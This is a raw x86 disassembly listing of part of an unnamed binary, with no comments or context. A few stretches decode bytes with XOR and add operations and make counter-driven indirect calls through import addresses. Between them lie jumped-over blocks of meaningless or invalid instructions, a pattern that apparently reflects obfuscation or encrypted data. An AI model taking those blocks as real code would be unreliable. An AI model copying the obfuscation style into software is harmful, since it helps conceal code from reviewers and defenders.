  410bb2:	inc    esi
  410bb3:	in     eax,dx
  410bb4:	dec    esp
  410bb5:	shl    edi,cl
  410bb7:	or     edi,ebx
  410bb9:	iret   
  410bba:	xor    BYTE PTR [edi+edi*1],0x11
  410bbe:	ret    
  410bbf:	push   edi
  410bc0:	mov    ch,0x44
  410bc2:	loop   0x410b5e
  410bc4:	mov    cl,BYTE PTR [edi+0x27]
  410bc7:	xchg   BYTE PTR [ecx-0x2eb7012b],ch
  410bcd:	jg     0x410c12
  410bcf:	loope  0x410c29
  410bd1:	fcom   DWORD PTR [ebx]
  410bd3:	cmp    ecx,DWORD PTR [ecx+0x64]
  410bd6:	mov    bl,BYTE PTR [esi+0x17]
  410bd9:	mov    ebp,DWORD PTR [eax-0x31]
  410bdc:	adc    ch,dl
  410bde:	dec    esp
  410bdf:	and    BYTE PTR [eax+0xf],dh
  410be2:	in     al,dx
  410be3:	mov    bl,0xf8
  410be5:	and    al,0x96
  410be7:	aaa    
  410be8:	sub    BYTE PTR es:[ecx-0x7b],0x65
  410bed:	aaa    
  410bee:	loopne 0x410c60
  410bf0:	imul   BYTE PTR [ebx-0x6687c659]
  410bf6:	loope  0x410bb3
  410bf8:	mov    WORD PTR [eax+0xe],?
  410bfb:	xor    BYTE PTR [edi+0x5d2137c2],ah
  410c01:	mov    eax,0xc2031c8
  410c06:	xor    ah,BYTE PTR [eax-0x199a71ca]
  410c0c:	(bad)  
  410c0d:	jmp    0x410bed
  410c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c10:	xchg   ebx,eax
  410c11:	leave  
  410c12:	push   ebp
  410c13:	lds    eax,FWORD PTR [ebx+0x570ac303]
  410c19:	push   ss
  410c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c1b:	mov    BYTE PTR [edi-0x10],al
  410c1e:	sbb    al,bl
  410c20:	push   edi
  410c21:	shl    DWORD PTR [edi+0x74],1
  410c24:	inc    esp
  410c25:	push   eax
  410c26:	xchg   ecx,eax
  410c27:	mov    WORD PTR [ebx],fs
  410c29:	aam    0x63
  410c2b:	sub    DWORD PTR [eax],0xfffffff8
  410c2e:	aaa    
  410c2f:	out    dx,al
  410c30:	shl    BYTE PTR [ecx-0x2e],1
  410c33:	pop    esi
  410c34:	es mov ah,0xdb
  410c37:	mov    BYTE PTR [ebx],0x54
  410c3a:	mov    ds,WORD PTR ss:[esi-0x66936020]
  410c41:	aam    0x3f
  410c43:	popf   
  410c44:	mov    cl,0x2f
  410c46:	sub    al,0xd3
  410c48:	push   esi
  410c49:	test   eax,0x1ee60061
  410c4e:	pop    ds
  410c4f:	aas    
  410c50:	loop   0x410bd4
  410c52:	bound  ebp,QWORD PTR [esp+ebx*8+0x2f0520b6]
  410c59:	rcl    DWORD PTR [ecx],cl
  410c5b:	je     0x410c65
  410c5d:	xor    DWORD PTR [eax],0x72
  410c60:	stos   DWORD PTR es:[edi],eax
  410c61:	outs   dx,DWORD PTR ds:[esi]
  410c62:	cmp    cl,BYTE PTR [ecx+0x755365f8]
  410c68:	sti    
  410c69:	sub    BYTE PTR [eax-0x2a],al
  410c6c:	js     0x410caf
  410c6e:	mov    bl,0x1a
  410c70:	ret    0xc6f2
  410c73:	inc    edi
  410c74:	dec    ecx
  410c75:	and    al,0xde
  410c77:	pop    edi
  410c78:	stos   DWORD PTR es:[edi],eax
  410c79:	push   cs
  410c7a:	mov    ebx,0x4b2f534d
  410c7f:	add    BYTE PTR [edx-0x7a],bh
  410c82:	jge    0x410c67
  410c84:	aaa    
  410c85:	das    
  410c86:	mov    ah,0x70
  410c88:	dec    edx
  410c89:	rol    al,1
  410c8b:	scas   al,BYTE PTR es:[edi]
  410c8c:	shl    cl,1
  410c8e:	enter  0x1d1e,0xd7
  410c92:	leave  
  410c93:	repnz dec ebp
  410c95:	cdq    
  410c96:	or     BYTE PTR [edx+0x10],ah
  410c99:	add    DWORD PTR [edi],ebp
  410c9b:	pushf  
  410c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c9e:	scas   eax,DWORD PTR es:[edi]
  410c9f:	sbb    DWORD PTR [ebx],0x54
  410ca2:	(bad)  
  410ca4:	rcr    BYTE PTR [ebx],1
  410ca6:	inc    ebx
  410ca7:	adc    bl,bh
  410ca9:	pop    edx
  410caa:	rol    edi,0x45
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    dh,BYTE PTR [eax+0x0]
  410dce:	icebp  
  410dcf:	(bad)  
  410dd0:	mov    WORD PTR [edi+0x7e],es
  410dd3:	jle    0x410dc6
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410d8a
  410dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dda:	adc    eax,0x60fb4c51
  410ddf:	jle    0x410e4b
  410de1:	dec    ebx
  410de2:	out    dx,al
  410de3:	cmp    edx,DWORD PTR [ebx]
  410de5:	sbb    eax,DWORD PTR [eax]
  410de7:	lock fnsetpm(287 only) 
  410dea:	jge    0x410d83
  410dec:	test   BYTE PTR [ecx+0x63630e33],bh
  410df2:	inc    ebx
  410df3:	not    ebx
  410df5:	leave  
  410df6:	push   0xad727156
  410dfb:	inc    esp
  410dfc:	inc    ecx
  410dfd:	mov    al,ds:0x29658d65
  410e02:	inc    bx
  410e04:	lea    ebx,[eax-0x5c769436]
  410e0a:	aas    
  410e0b:	xor    bl,ah
  410e0d:	jmp    0x14d7:0xc8c7bd76
  410e14:	cmc    
  410e15:	mov    eax,0x40f64ed8
  410e1a:	mov    eax,0xb2ca2ca2
  410e1f:	mov    ch,0x95
  410e21:	sbb    al,BYTE PTR [edi-0x199ea189]
  410e27:	retf   
  410e28:	push   ebp
  410e29:	push   0x757548f4
  410e2e:	test   DWORD PTR [ecx],ebp
  410e30:	or     DWORD PTR [eax],esi
  410e32:	push   0xffffffa8
  410e34:	sub    BYTE PTR [ebx],ch
  410e36:	sbb    ch,BYTE PTR [edi]
  410e38:	dec    esp
  410e39:	out    0x36,eax
  410e3b:	and    eax,0xc391b7f2
  410e40:	and    eax,DWORD PTR [eax-0x29]
  410e43:	cmp    DWORD PTR [ebx+0x39c563c6],ebp
  410e49:	(bad)  
  410e4a:	jns    0x410e17
  410e4c:	faddp  st(1),st
  410e4e:	adc    DWORD PTR [ebx],eax
  410e50:	push   eax
  410e51:	mov    ds:0x9e7fcec7,eax
  410e56:	es cs mov esi,0xc7e8b15e
  410e5d:	or     BYTE PTR [ecx],cl
  410e5f:	or     edi,edx
  410e61:	mov    ebp,0x33c1ea03
  410e66:	pop    edx
  410e67:	inc    ebp
  410e68:	or     ah,BYTE PTR [ecx+ecx*1]
  410e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e6c:	xor    eax,0xd7c24ea6
  410e71:	add    edx,DWORD PTR [eax-0x6e]
  410e74:	sahf   
  410e75:	mov    bl,0x8a
  410e77:	jp     0x410ebc
  410e79:	cmp    BYTE PTR ds:0x4c31ff89,0xda
  410e80:	adc    al,0x97
  410e82:	ficom  DWORD PTR [ebp+0x32]
  410e85:	xchg   esi,eax
  410e86:	add    eax,0x51c69552
  410e8b:	inc    ebp
  410e8c:	inc    esp
  410e8d:	mov    eax,0xc33f1a48
  410e92:	aam    0xa9
  410e94:	call   0x28e7:0xc59e6481
  410e9b:	mov    dl,0xfb
  410e9d:	mov    ah,0x52
  410e9f:	ja     0x410e85
  410ea1:	in     eax,dx
  410ea2:	xchg   ebx,eax
  410ea3:	sub    al,0x72
  410ea5:	(bad)  
  410ea7:	ins    DWORD PTR es:[edi],dx
  410ea8:	mov    bh,0x73
  410eaa:	test   al,0x66
  410eac:	pop    esi
  410ead:	les    eax,FWORD PTR [esi+0x6f]
  410eb0:	ror    ecx,cl
  410eb2:	dec    eax
  410eb3:	leave  
  410eb4:	mov    cl,0x2d
  410eb6:	adc    ecx,DWORD PTR [edx+0x7f]
  410eb9:	push   eax
  410eba:	mov    edx,0xb9e463b2
  410ebf:	inc    ebx
  410ec0:	or     DWORD PTR ds:0xb124b11b,0x54a846c
  410eca:	add    al,0x29
  410ecc:	adc    al,0x1a
  410ece:	xchg   edx,eax
  410ecf:	scas   eax,DWORD PTR es:[edi]
  410ed0:	jns    0x410e7f
  410ed2:	push   ebp
  410ed3:	dec    edx
  410ed4:	adc    eax,0xf341b3d2
  410ed9:	or     DWORD PTR [edi+0xd1d0b69],edx
  410edf:	int    0x2c
  410ee1:	ja     0x410e78
  410ee3:	inc    esp
  410ee4:	dec    ebx
  410ee5:	mov    ecx,0x97d3d66c
  410eea:	push   0xfffffff2
  410eec:	jge    0x410f0b
  410eee:	and    bl,dl
  410ef0:	fcmovu st,st(2)
  410ef2:	sbb    ax,WORD PTR [ebx+eiz*8-0x5d3474f1]
  410efa:	sar    BYTE PTR [ebx+0x3862e1e4],0xda
  410f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f02:	(bad)  
  410f03:	fwait
  410f04:	addr16 mov ch,0x51
  410f07:	aas    
  410f08:	(bad)  
  410f09:	in     eax,0x7e
  410f0b:	cmp    eax,0x6b11d702
  410f10:	jmp    0x410eb3
  410f12:	mov    al,ds:0x700448e9
  410f17:	and    eax,0xc644a882
  410f1c:	pop    ecx
  410f1d:	mov    bh,0x9f
  410f1f:	lods   al,BYTE PTR ds:[esi]
  410f20:	lds    ebp,FWORD PTR [edx-0x2f]
  410f23:	int3   
  410f24:	mov    dl,0xe9
  410f26:	jmp    0x6282d16
  410f2b:	mov    edx,edi
  410f2d:	test   ebx,0x93dfac64
  410f33:	out    dx,al
  410f34:	add    eax,0xd7dd1b3a
  410f39:	sub    eax,0xbc6cba6d
  410f3e:	test   al,0x9f
  410f40:	sub    al,0x9a
  410f42:	cmp    ah,al
  410f44:	lods   eax,DWORD PTR ds:[esi]
  410f45:	mov    BYTE PTR [edi],dl
  410f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f48:	add    eax,0xff56275b
  410f4d:	and    DWORD PTR [ecx+0x15c88287],0x8641a90
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	rcl    BYTE PTR [ebp+0x450f5400],1
  410ffe:	jle    0x41107e
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x41106f
  411005:	pop    ebx
  411006:	cwde   
  411007:	cmp    dl,BYTE PTR [eax]
  411009:	mov    ah,0x92
  41100b:	inc    esi
  41100c:	test   al,0xb0
  41100e:	arpl   WORD PTR [ebx],sp
  411010:	stc    
  411011:	push   0x3dd1f96a
  411016:	and    esp,edi
  411018:	sub    DWORD PTR [edi+ebx*4-0x1c4f0788],edi
  41101f:	push   eax
  411020:	retf   0x70e3
  411023:	sti    
  411024:	mov    ecx,0x9f8bd8ef
  411029:	or     ebp,ebx
  41102b:	mov    dh,cl
  41102d:	xor    esp,DWORD PTR cs:0x58fcc920
  411034:	leave  
  411035:	(bad)  [ecx]
  411037:	pop    edx
  411038:	(bad)  
  411039:	repnz aad 0x3f
  41103c:	or     DWORD PTR [ebp-0x3c6b52e9],ebp
  411042:	test   eax,0xd4713d4a
  411047:	dec    esp
  411048:	sub    dl,BYTE PTR [ecx+edi*2+0x79d67446]
  41104f:	bound  esi,QWORD PTR [ecx-0x579fbc0e]
  411055:	jg     0x4110ca
  411057:	pop    eax
  411058:	sub    DWORD PTR [esp+esi*8-0x5d],0x6a
  41105d:	and    BYTE PTR [edx],0xb6
  411060:	scas   al,BYTE PTR es:[edi]
  411061:	mov    ecx,0xb1b631d1
  411066:	cmp    BYTE PTR gs:[esp+ebp*2],ch
  41106a:	cmp    BYTE PTR [esi+esi*2-0xd],dh
  41106e:	dec    ecx
  41106f:	in     eax,dx
  411070:	push   esp
  411071:	popf   
  411072:	mov    dl,0xdc
  411074:	jb     0x4110bd
  411076:	mov    esi,0x91413603
  41107b:	iret   
  41107c:	pushf  
  41107d:	lea    edx,[eax+0x5d]
  411080:	fwait
  411081:	add    edi,esi
  411083:	mov    ah,0xd8
  411085:	popf   
  411086:	call   0x9714:0x57acc7e2
  41108d:	jne    0x411067
  41108f:	sbb    eax,0xa699aba
  411094:	fdiv   DWORD PTR [ebx+0x3e8ebf37]
  41109a:	pop    edi
  41109b:	nop
  41109c:	inc    edx
  41109d:	push   0xdb083c4
  4110a2:	xor    al,0x95
  4110a4:	sub    DWORD PTR [eax-0x39],0x71
  4110a8:	mov    cl,0x6d
  4110aa:	addr16 mov al,0x67
  4110ad:	or     ebp,ecx
  4110af:	imul   edx,eax,0xf5628df8
  4110b5:	or     esi,DWORD PTR [esi+0x6160e6c2]
  4110bb:	jg     0x4110ad
  4110bd:	mov    WORD PTR [edx+0x18],gs
  4110c0:	inc    edx
  4110c1:	test   al,0xd4
  4110c3:	or     al,BYTE PTR [ebp-0x71]
  4110c6:	and    eax,0x6c3bad3a
  4110cb:	sbb    eax,0x9ece2472
  4110d0:	mov    esi,0x1478ea50
  4110d5:	mov    WORD PTR [edx+0x27],fs
  4110d8:	arpl   WORD PTR [esi+0x37b51115],dx
  4110de:	and    al,0x46
  4110e0:	ins    DWORD PTR es:[edi],dx
  4110e1:	and    al,BYTE PTR [edi+0x6f]
  4110e4:	ins    DWORD PTR es:[edi],dx
  4110e5:	push   0x65
  4110e7:	jmp    0x4110c5
  4110e9:	xchg   edi,eax
  4110ea:	loopne 0x411095
  4110ec:	inc    eax
  4110ed:	aam    0xe0
  4110ef:	out    0xff,eax
  4110f1:	jno    0x4110ed
  4110f3:	mov    ah,0x2b
  4110f5:	and    esi,esp
  4110f7:	pushf  
  4110f8:	cmp    al,0xfc
  4110fa:	and    al,0xe3
  4110fc:	mov    dh,0xf8
  4110fe:	xchg   esp,eax
  4110ff:	dec    eax
  411100:	fwait
  411101:	sbb    eax,DWORD PTR [edx+0x72]
  411104:	mov    ds,WORD PTR [edx-0x74884d6]
  41110a:	or     eax,0x3080207b
  41110f:	jmp    0xc24e7c78
  411114:	adc    ecx,edi
  411116:	and    al,0x3d
  411118:	xor    ecx,DWORD PTR [ebp*1-0x5dc8aa5b]
  41111f:	shl    BYTE PTR [ebp+0x55],1
  411122:	jecxz  0x411105
  411124:	sbb    eax,DWORD PTR [eax-0x59]
  411127:	cmc    
  411128:	mov    eax,ds:0xe4effac7
  41112d:	rcr    edi,cl
  41112f:	in     eax,dx
  411130:	loop   0x4110bb
  411132:	(bad)
  411136:	and    al,0xb3
  411138:	daa    
  411139:	inc    ecx
  41113a:	or     ch,BYTE PTR [ebp-0x5de7eeb4]
  411140:	mov    esp,0xeb1d9f13
  411145:	lahf   
  411146:	sub    DWORD PTR [ebp+0x7c957c79],ebp
  41114c:	stc    
  41114d:	lods   al,BYTE PTR ds:[esi]
  41114e:	jno    0x4111a5
  411150:	dec    esp
  411151:	mov    bh,0xe0
  411153:	call   0xaefb:0xddee67fa
  41115a:	dec    ebp
  41115b:	lock jo 0x4110f3
  41115e:	es (bad) 
  411160:	test   eax,0x94c18c9e
  411165:	xchg   esi,eax
  411166:	push   DWORD PTR [ecx-0x441a6762]
  41116c:	lea    ebx,[ebp*1-0x46c3e470]
  411173:	mov    ss:0xa88cac90,eax
  411179:	adc    eax,0x95822ea
  41117e:	push   esp
  41117f:	push   es
  411180:	loope  0x411199
  411182:	dec    ebx
  411183:	mov    edi,0x3b02
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0x30dabba7
  4111f1:	sbb    eax,0x428eb379
  4111f6:	jle    0x411276
  4111f8:	icebp  
  4111f9:	jg     0x411279
  4111fb:	jle    0x41117d
  4111fd:	fisubr WORD PTR [ebx]
  4111ff:	addr16 or esp,ecx
  411202:	outs   dx,DWORD PTR ds:[esi]
  411203:	jne    0x4111a4
  411205:	adc    DWORD PTR [esi],0x66
  411208:	xchg   ecx,eax
  411209:	inc    edx
  41120a:	loopne 0x411193
  41120c:	arpl   WORD PTR [edi+0x114d1ebe],di
  411212:	pusha  
  411213:	jno    0x411268
  411215:	xor    esp,DWORD PTR [ecx-0x3299d67e]
  41121b:	mov    bl,0xc4
  41121d:	or     esp,eax
  41121f:	adc    ch,BYTE PTR [ecx]
  411221:	(bad)  
  411222:	in     al,0x37
  411224:	test   al,0x53
  411226:	aaa    
  411227:	retf   0x8d6b
  41122a:	(bad)  
  41122c:	ret    
  41122d:	iret   
  41122e:	leave  
  41122f:	(bad)  
  411230:	outs   dx,BYTE PTR ds:[esi]
  411231:	xchg   ecx,eax
  411232:	mov    ebx,0x75dda4e
  411237:	sar    DWORD PTR [edi+0x7811be0f],cl
  41123d:	fiadd  DWORD PTR [edi]
  41123f:	sar    ecx,cl
  411241:	xchg   ebp,eax
  411242:	call   0x22de637f
  411247:	stos   BYTE PTR es:[edi],al
  411248:	or     dh,dl
  41124a:	adc    DWORD PTR [edx+0x37748162],0x6
  411251:	push   edx
  411252:	inc    eax
  411253:	xchg   eax,edi
  411255:	test   BYTE PTR [ebp-0x6d],ch
  411258:	je     0x4112ca
  41125a:	and    eax,0x11d74c3e
  41125f:	cmp    al,0xf0
  411261:	cli    
  411262:	(bad)  [esi+0x6a9608a3]
  411268:	xor    DWORD PTR [edi+0x40],0x49
  41126c:	fwait
  41126d:	dec    ebx
  41126e:	adc    al,0xfa
  411270:	pop    edi
  411271:	push   0x37
  411273:	stos   BYTE PTR es:[edi],al
  411274:	xchg   ecx,eax
  411275:	arpl   WORD PTR [eax],si
  411277:	mov    ebx,0x7b17d621
  41127c:	cdq    
  41127d:	add    DWORD PTR [ebx+edx*2+0x6f],edx
  411281:	mov    al,0xb7
  411283:	into   
  411284:	mov    eax,0x7de5764
  411289:	xchg   ebp,eax
  41128a:	in     al,0x5d
  41128c:	cdq    
  41128d:	jbe    0x411230
  41128f:	dec    esp
  411290:	xor    eax,0x130d2a26
  411295:	and    ebx,edi
  411297:	popf   
  411298:	mov    al,ds:0x109dfcaa
  41129d:	cld    
  41129e:	jecxz  0x4112fa
  4112a0:	mov    WORD PTR [ebx+0x2e71289],?
  4112a6:	mov    al,0xec
  4112a8:	cmp    DWORD PTR [edi+0x5daa11fc],ebp
  4112ae:	or     dh,BYTE PTR [edx-0x61]
  4112b1:	mov    ss,esi
  4112b3:	mov    ds,WORD PTR [esi+ecx*2]
  4112b6:	inc    eax
  4112b7:	sub    bl,BYTE PTR [edi-0x6e]
  4112ba:	and    eax,0x6478ab55
  4112bf:	inc    BYTE PTR [esi-0x37]
  4112c2:	xor    al,0x70
  4112c4:	adc    al,0x6
  4112c6:	and    eax,0x6d1b219b
  4112cb:	jo     0x4112b5
  4112cd:	loopne 0x41127a
  4112cf:	sbb    edx,DWORD PTR ds:0x4180d6b2
  4112d5:	(bad)  
  4112d6:	fsub   QWORD PTR [ebp-0x47]
  4112d9:	dec    ebp
  4112da:	push   0x39
  4112dc:	inc    edi
  4112dd:	jbe    0x41129f
  4112df:	or     DWORD PTR [ecx],ecx
  4112e1:	(bad)  
  4112e2:	fdiv   QWORD PTR [ecx]
  4112e4:	popf   
  4112e5:	inc    ebp
  4112e6:	dec    esp
  4112e7:	jg     0x41130b
  4112e9:	add    BYTE PTR [eax+0xa37f60e],dl
  4112ef:	push   ebx
  4112f0:	clc    
  4112f1:	push   ss
  4112f2:	pop    ebp
  4112f3:	iret   
  4112f4:	mov    bh,0x8a
  4112f6:	out    0xf6,eax
  4112f8:	xchg   ebx,eax
  4112f9:	adc    eax,0xaecf8cf3
  4112fe:	jmp    0xdac5:0xb4aad6b6
  411305:	mov    ecx,0x992b29fa
  41130a:	pushf  
  41130b:	jle    0x4112f6
  41130d:	dec    ecx
  41130e:	ror    DWORD PTR [ebp-0xb],1
  411311:	pop    ss
  411312:	and    dh,BYTE PTR [ebp-0x73]
  411315:	sub    eax,0xf0516638
  41131a:	lea    esi,[eax+edx*2]
  41131d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41131e:	nop
  41131f:	addr16 inc ecx
  411321:	jnp    0x411339
  411323:	lea    ebx,[ecx]
  411325:	jmp    0x34ec6ccb
  41132a:	aad    0x54
  41132c:	in     al,dx
  41132d:	push   edi
  41132e:	ja     0x4112e7
  411330:	ret    0x7abf
  411333:	dec    esi
  411334:	mov    ebp,0xa9536473
  411339:	sahf   
  41133a:	stc    
  41133b:	jne    0x411371
  41133d:	dec    eax
  41133e:	hlt    
  41133f:	idiv   ah
  411341:	imul   ecx,DWORD PTR [ecx-0x16880ce2],0x29729b8f
  41134b:	jp     0x411362
  41134d:	test   eax,0x4d3ac6a6
  411352:	cs (bad) 
  411354:	loopne 0x4112ff
  411356:	je     0x4112ee
  411358:	stos   BYTE PTR es:[edi],al
  411359:	cmp    DWORD PTR [esi+0x26],0x62
  41135d:	mov    eax,ds:0xf664998a
  411362:	mov    esi,ebx
  411364:	push   edx
  411365:	shl    DWORD PTR [ebx],cl
  411367:	mov    ch,BYTE PTR [ecx-0x4f195a14]
  41136d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41136e:	scas   al,BYTE PTR es:[edi]
  41136f:	push   0xf
  411371:	ror    bl,1
  411373:	and    BYTE PTR [ebp+0x55e161fc],bl
  411379:	add    ebp,DWORD PTR [ebp-0x76]
  41137c:	inc    esp
  41137d:	add    eax,0xc558ba8
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x630763a1],ecx
  4113db:	jmp    0x7ebf53e1
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x4113ae
  4113e5:	out    dx,eax
  4113e6:	jnp    0x4113c3
  4113e8:	cdq    
  4113e9:	pop    ecx
  4113ea:	push   0x55b59b8b
  4113ef:	jge    0x41138a
  4113f1:	adc    eax,0x8376a8f7
  4113f6:	jecxz  0x411474
  4113f8:	fist   DWORD PTR [ecx+0x1b1daac9]
  4113fe:	cdq    
  4113ff:	es jmp 0xc82bdef4
  411405:	sub    al,0xec
  411407:	jae    0x411419
  411409:	(bad)  
  41140a:	xchg   edi,eax
  41140b:	int    0xa5
  41140d:	clc    
  41140e:	adc    DWORD PTR [ecx+0x5059efd5],ebp
  411414:	jb     0x411410
  411416:	fist   WORD PTR [edx-0x11]
  411419:	add    DWORD PTR [edx+0x29d1b171],ecx
  41141f:	rcl    DWORD PTR [edi-0x68],0x21
  411423:	or     ah,BYTE PTR ds:[eax+ecx*1+0x76dd4433]
  41142b:	out    0xf4,eax
  41142d:	imul   ch
  41142f:	imul   ebx,DWORD PTR [eax-0x453009f0],0xffffffad
  411436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411437:	lods   al,BYTE PTR ds:[esi]
  411438:	pop    esi
  411439:	mov    BYTE PTR [ebx],al
  41143b:	gs mov ch,0xc9
  41143e:	(bad)  
  41143f:	dec    esi
  411440:	cmp    edi,DWORD PTR [edi+0x2a574040]
  411446:	inc    edi
  411447:	aas    
  411448:	sbb    dh,bl
  41144a:	lods   eax,DWORD PTR ds:[esi]
  41144b:	dec    ecx
  41144c:	dec    ecx
  41144d:	push   cs
  41144e:	dec    esi
